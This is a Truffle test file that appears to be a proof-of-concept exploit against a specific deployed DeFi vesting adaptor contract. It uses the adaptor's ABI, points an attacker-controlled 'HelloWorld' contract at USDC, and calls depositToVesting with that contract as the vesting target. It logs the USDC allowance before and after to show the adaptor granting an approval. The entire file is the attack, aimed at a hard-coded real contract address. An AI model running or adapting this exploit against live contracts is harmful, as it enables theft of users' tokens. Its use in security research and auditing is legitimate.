var HelloWorld = artifacts.require("HelloWorld");
var ierc20 = artifacts.require("IERC20");
const Web3 = require('web3');


contract('depositToV', function(accounts){

  let stuffInstance;
  

  var v_contract = "0x1eAA1a100a460f46A2032f0402Bc01FE89FaAB60";
  var abi = [{"inputs":[],"name":"BaseAdaptor__BadSlippage","type":"error"},{"inputs":[],"name":"BaseAdaptor__ExchangeNotSupported","type":"error"},{"inputs":[],"name":"BaseAdaptor__ExternalReceiverBlocked","type":"error"},{"inputs":[],"name":"BaseAdaptor__UserDepositsNotAllowed","type":"error"},{"inputs":[],"name":"BaseAdaptor__UserWithdrawsNotAllowed","type":"error"},{"inputs":[{"internalType":"bytes","name":"adaptorData","type":"bytes"}],"name":"assetOf","outputs":[{"internalType":"contract ERC20","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes","name":"adaptorData","type":"bytes"}],"name":"assetsUsed","outputs":[{"internalType":"contract ERC20[]","name":"assets","type":"address[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes","name":"adaptorData","type":"bytes"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"bytes","name":"","type":"bytes"},{"internalType":"bytes","name":"","type":"bytes"}],"name":"deposit","outputs":[],"stateMutability":"pure","type":"function"},{"inputs":[{"internalType":"contract VestingSimple","name":"vestingContract","type":"address"},{"internalType":"uint256","name":"amountToDeposit","type":"uint256"}],"name":"depositToVesting","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"identifier","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"pure","type":"function"},{"inputs":[],"name":"isDebt","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"pure","type":"function"},{"inputs":[{"internalType":"contract ERC20","name":"assetIn","type":"address"},{"internalType":"contract ERC20","name":"assetOut","type":"address"},{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"enum SwapRouter.Exchange","name":"exchange","type":"uint8"},{"internalType":"bytes","name":"params","type":"bytes"},{"internalType":"uint64","name":"slippage","type":"uint64"}],"name":"oracleSwap","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"contract ERC20","name":"asset","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"revokeApproval","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"contract ERC20","name":"assetIn","type":"address"},{"internalType":"contract ERC20","name":"assetOut","type":"address"},{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"enum SwapRouter.Exchange","name":"exchange","type":"uint8"},{"internalType":"bytes","name":"params","type":"bytes"}],"name":"swap","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"assets","type":"uint256"},{"internalType":"address","name":"receiver","type":"address"},{"internalType":"bytes","name":"adaptorData","type":"bytes"},{"internalType":"bytes","name":"","type":"bytes"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"contract VestingSimple","name":"vestingContract","type":"address"}],"name":"withdrawAllFromVesting","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"contract VestingSimple","name":"vestingContract","type":"address"},{"internalType":"uint256","name":"amountToWithdraw","type":"uint256"}],"name":"withdrawAnyFromVesting","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"contract VestingSimple","name":"vestingContract","type":"address"},{"internalType":"uint256","name":"depositId","type":"uint256"},{"internalType":"uint256","name":"amountToWithdraw","type":"uint256"}],"name":"withdrawFromVesting","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes","name":"adaptorData","type":"bytes"},{"internalType":"bytes","name":"","type":"bytes"}],"name":"withdrawableFrom","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}]

  before(async () => {
    stuffInstance = await HelloWorld.deployed();
  });

  it("setUp and exploit", async () =>  {
       var _usdc = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
       // set asset to usdc
       const p = await stuffInstance.set(_usdc);
       const usdc = await ierc20.at(_usdc);
//       const s = await stuffInstance.asset.call();
//       console.log("asset set to :" + s);

       // compile vuln      
       const vcon = new web3.eth.Contract(abi,v_contract);       
//       console.log(vcon._address);

      // approval before exploit
      const approvalBefore = await usdc.allowance(vcon._address,stuffInstance.address);
      console.log("approval before :" + approvalBefore);
      // call vulnerable with exploit

     const af = await vcon.methods.depositToVesting(stuffInstance.address,1);
     // approval after exploit
     const approvalAfter = await usdc.allowance(vcon._address,stuffInstance.address);
     console.log("after is: " + approvalAfter);
    });

 });
